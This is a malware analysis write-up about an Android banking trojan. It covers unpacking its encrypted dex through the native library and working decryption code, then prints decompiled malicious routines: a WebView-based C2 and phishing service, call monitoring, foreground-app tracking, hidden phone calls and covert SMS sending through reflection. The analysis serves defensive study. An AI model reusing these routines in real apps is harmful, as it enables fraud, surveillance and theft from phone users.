# Android Troj-Bank Analysis
## Sample info
### Sample sha256(you can get more info from koodous)
 - 7b33baf796af6885251c0860c530057207b2ef302bf0c246fd862e172a8efc8e

### How to get it.
 [Download it from koodous market.](https://koodous.com/apks/7b33baf796af6885251c0860c530057207b2ef302bf0c246fd862e172a8efc8e)
## Analyze unencrypted dex file
### Using JEB open it.
You can't find MainActivity class. But you notice two functions in MainApplication class as follows.

```java
public native void antidebug() {
}

protected void attachBaseContext(Context arg3) {
    super.attachBaseContext(arg3);
    Native.load();
    try {
        DexManipulation.loadEncryptedDex(this.getAssets().open("classes.dat"), arg3);
    }
    catch(Exception v0) {
        v0.printStackTrace();
    }
}
```
### Anti-debug
Use ptrace for anti-debug
![](https://github.com/JohnCUMT/Android-Project/blob/master/15563416046804.jpg)

### Start loading encrypted Dex
Now, we need to analyze loadEncryptedDex function in DexManipulation class. After analysis, you can get function scheduling order as follows:
```
Step1.DexManipulation.loadEncryptedDex(this.getAssets().open("classes.dat"), context);
Step2.DexManipulation.decryptDex(v12, v3);
Step3.Native.decrypt(v2_3.toByteArray());
```

Next,Wen need to analyze Native.decrypt function. Unfortunately, it's a native function.
```java
public class Native {
    public Native() {
        super();
    }

    public static native byte[] decrypt(byte[] arg0) {}

    public static void load() {
        System.loadLibrary("secure_lib");
    }
}

```
### Looking for the decryption algorithm
Using IDA open secure_lib.so, its functions relation is as follows:


![](https://github.com/JohnCUMT/Android-Project/blob/master/functions.png)

its function scheduling order is very complex and it has antidebug function by ptrace itself. So, we can using "black box" to decrypt dex.

## Start decrypting Dex
### Using Android Studio to build module as com.protector.testing2, new package as com.protector.testing2.helper, build Native class under this package as follows:
```java
public class Native {
    public Native() {
        super();
    }

    public static native byte[] decrypt(byte[] arg0) {}

    public static void load() {
        System.loadLibrary("secure_lib");
    }
}

```

Now we write decrypt code. We need to build DexManipulation class under this package as follows:
```java
package com.protector.testing2.helper;

import android.content.Context;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class DexManipulation {
    public DexManipulation() {
        super();
    }
    public static void close(Closeable closeable) {
        if(closeable == null) {
            return;
        }
        try {
            closeable.close();
        }
        catch(IOException v0) {
        }
    }

    public static void decryptDex(InputStream inputStream, File file) {
        File parentFile = file.getParentFile();
        Closeable closeable = null;
        if(!parentFile.exists() && (parentFile.isDirectory())) {
            parentFile.mkdirs();
        }
        if(file.exists()) {
            file.delete();
        }
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] array = new byte[0x100000];
            while(true) {
                int length = inputStream.read(array);
                int len = length;
                if(length == -1) {
                    break;
                }
                byteArrayOutputStream.write(array, 0, len);
            }
            byte[] decryptArray = Native.decrypt(byteArrayOutputStream.toByteArray());
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            fileOutputStream.write(decryptArray, 0, decryptArray.length);
            fileOutputStream.flush();
            DexManipulation.close(((Closeable)inputStream));
            DexManipulation.close(closeable);
        }
        catch(Throwable v2) {
            DexManipulation.close(((Closeable)inputStream));
            DexManipulation.close(closeable);
        }
    }

    public static void loadEncryptedDex(InputStream dexInput, Context context) {
        try {
            File decryptFile = new File(context.getDir("decrypted", 0), "classes.dex");
            try {
                System.out.println("----------------------------");
                System.out.println("Start Decrypt");
                decryptDex(dexInput, decryptFile);
                System.out.println("----------------------------");
                System.out.println("Decrypt Done");
                System.out.println("----------------------------");
            } catch (Exception e) {
                e.printStackTrace();

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Ok, Next we call decryption code in MainActivity class as follows:
```java
public class MainActivity extends AppCompatActivity {
    static {
        System.loadLibrary("secure_lib");
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        try {
            DexManipulation.loadEncryptedDex(this.getAssets().open("classes.dat"), this);
        }
        catch(Exception exception) {
            exception.printStackTrace();
        }
    }
}
```

### The result we are expecting
```shell
λ adb shell
bullhead:/ $ su
bullhead:/ # cd /data/data/com.protector.testing2/
bullhead:/data/data/com.protector.testing2 # ls
app_decrypted cache code_cache lib
bullhead:/data/data/com.protector.testing2 # cd app_decrypted/
bullhead:/data/data/com.protector.testing2/app_decrypted # ls
classes.dex
```

![](https://github.com/JohnCUMT/Android-Project/blob/master/decrypt_dex.png)

## Malicious behavior analysis

### Potential malicious behavior caused by dangerous permissions
![](https://github.com/JohnCUMT/Android-Project/blob/master/15557402673535.jpg)

### Phishing & Send data to C2
```
public int onStartCommand(Intent arg12, int arg13, int arg14) {
        if(arg12 != null) {
            Bundle v2 = arg12.getExtras();
            if(v2 != null) {
                String v0 = this.getexstras(v2, "content");
                String v4 = this.getexstras(v2, "type");
                String v1 = this.getexstras(v2, "data");
                WebView v7 = new WebView(this.getApplicationContext());
                v7.setLayoutParams(new TableRow$LayoutParams(0, -2, 1f));
                v7.addJavascriptInterface(new MeSetting(this.getApplicationContext()), "MeSetting");
                v7.addJavascriptInterface(new MeSystem(this.getApplicationContext()), "MeSystem");
                v7.addJavascriptInterface(new MeFile(this.getApplicationContext()), "MeFile");
                v7.addJavascriptInterface(new MePackage(this.getApplicationContext()), "MePackage");
                v7.addJavascriptInterface(new MeContent(this.getApplicationContext()), "MeContent");
                v7.addJavascriptInterface(new MeAction(this.getApplicationContext()), "MeAction");
                WebSettings v6 = v7.getSettings();
                v6.setSavePassword(true);
                v6.setSaveFormData(true);
                v6.setAllowFileAccess(true);
                if(Build$VERSION.SDK_INT >= 16) {
                    v6.setAllowFileAccessFromFileURLs(true);
                    v6.setAllowUniversalAccessFromFileURLs(true);
                }

                v6.setJavaScriptEnabled(true);
                v6.setUserAgentString("Hash: " + GlobalCode.getUniqueID(this.getApplicationContext()));
                if(v0.substring(0, 7).contains("http://")) {
                    v7.loadUrl(Uri.parse(v0).buildUpon().appendQueryParameter("type", v4).appendQueryParameter("data", v1).build().toString());
                }

                if(v0.substring(0, 8).contains("file:///")) {
                    v7.loadUrl(Uri.parse(v0).buildUpon().build().toString());
                }

                if(!v0.substring(0, 11).contains("javascript:")) {
                    goto label_116;
                }

                v7.loadData("<script>" + v0.substring(11) + "</script>", "text/html; charset=UTF-8", null);
            }
        }

    label_116:
        this.stopSelf();
        return 1;
    }
```

### monitor incoming call
```
public class MyPhoneStateListener extends PhoneStateListener {
        public MyPhoneStateListener(IncomingCall arg1) {
            IncomingCall.this = arg1;
            super();
        }

        public String getcmd(Context arg5, String arg6) {
            return arg5.getSharedPreferences("Cmd_conf", 0).getString(arg6, "");
        }

        public void onCallStateChanged(int arg10, String arg11) {
            Map v2 = IncomingCall.this.ctx.getSharedPreferences("Call_conf", 0).getAll();
            if(v2.size() > 0) {
                Iterator v5 = v2.keySet().iterator();
                while(v5.hasNext()) {
                    Object v3 = v5.next();
                    String v0 = this.getcmd(IncomingCall.this.ctx, ((String)v3));
                    if(v0.length() <= 2) {
                        continue;
                    }

                    Intent v1 = new Intent(IncomingCall.this.ctx, GlobalCode.class);
                    v1.putExtra("content", v0);
                    v1.putExtra("type", "TriggerCall:" + (((String)v3)));
                    v1.putExtra("data", String.valueOf(arg10) + ":" + arg11);
                    IncomingCall.this.ctx.startService(v1);
                }
            }
        }
}
```
### Get running app
If financial app or other special apps are running, this malware can start phishing attack.
```java

String[] getActivePackages() {
        Object v1 = this.getSystemService("activity");
        HashSet v0 = new HashSet();
        Iterator v4 = ((ActivityManager)v1).getRunningAppProcesses().iterator();
        while(v4.hasNext()) {
            Object v2 = v4.next();
            if(((ActivityManager$RunningAppProcessInfo)v2).importance != 100) {
                continue;
            }

            ((Set)v0).addAll(Arrays.asList(((ActivityManager$RunningAppProcessInfo)v2).pkgList));
        }

        return ((Set)v0).toArray(new String[((Set)v0).size()]);
}
```
### Call
```java
public void call(String arg5, int arg6) {
    Intent v0 = new Intent("android.intent.action.CALL", Uri.parse("tel:" + arg5.replace("#", Uri.encode("#"))));
    v0.putExtra("com.android.phone.extra.slot", arg6);
    v0.putExtra("simSlot", arg6);
    v0.setFlags(0x30000000);
    this.mContext.startActivity(v0);
}
```
### Send SMS
```java
public boolean sendMultipartTextSMS(int arg12, String arg13, ArrayList arg14) {
        boolean v6;
        Context v0 = this.mContext;
        if(arg12 == 0) {
            try {
                String v3 = "isms";
                goto label_3;
            label_78:
                if(arg12 == 1) {
                    v3 = "isms2";
                }
                else {
                    throw new Exception("can not get service which for sim \'" + arg12 + "\', only 0,1 accepted as values");
                }

            label_3:
                Method v2 = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", String.class);
                v2.setAccessible(true);
                Object v4 = v2.invoke(null, v3);
                v2 = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", IBinder.class);
                v2.setAccessible(true);
                Object v5 = v2.invoke(null, v4);
                if(Build$VERSION.SDK_INT < 18) {
                    v5.getClass().getMethod("sendMultipartText", String.class, String.class, List.class, List.class, List.class).invoke(v5, arg13, null, arg14, null, null);
                }
                else {
                    v5.getClass().getMethod("sendMultipartText", String.class, String.class, String.class, List.class, List.class, List.class).invoke(v5, v0.getPackageName(), arg13, null, arg14, null, null);
                }

                v6 = true;
                return v6;
            }
            catch(ClassNotFoundException v1) {
            }......
}
```

```java
public boolean sendSMS(int arg12, String arg13, String arg14) {
        boolean v6;
        Context v0 = this.mContext;
        if(arg12 == 0) {
            try {
                String v3 = "isms";
                goto label_3;
            label_78:
                if(arg12 == 1) {
                    v3 = "isms2";
                }
                else {
                    throw new Exception("can not get service which for sim \'" + arg12 + "\', only 0,1 accepted as values");
                }

            label_3:
                Method v2 = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", String.class);
                v2.setAccessible(true);
                Object v4 = v2.invoke(null, v3);
                v2 = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", IBinder.class);
                v2.setAccessible(true);
                Object v5 = v2.invoke(null, v4);
                if(Build$VERSION.SDK_INT < 18) {
                    v5.getClass().getMethod("sendText", String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(v5, arg13, null, arg14, null, null);
                }
                else {
                    v5.getClass().getMethod("sendText", String.class, String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(v5, v0.getPackageName(), arg13, null, arg14, null, null);
                }

                v6 = true;
                return v6;
            }
}
```

### Get action from SharedPreference
- Boot_conf
- Call_conf
- Cmd_conf
- Network_conf
- Power_conf
- SMS_conf
- Start_conf
- Timeout_conf
- Timers_conf

### Other behavior
- Change c2 domain
- Execute js script
- etc...

## Q & A
If you have any questions, please comment in the comment area，I will answer.Thank you for reading.
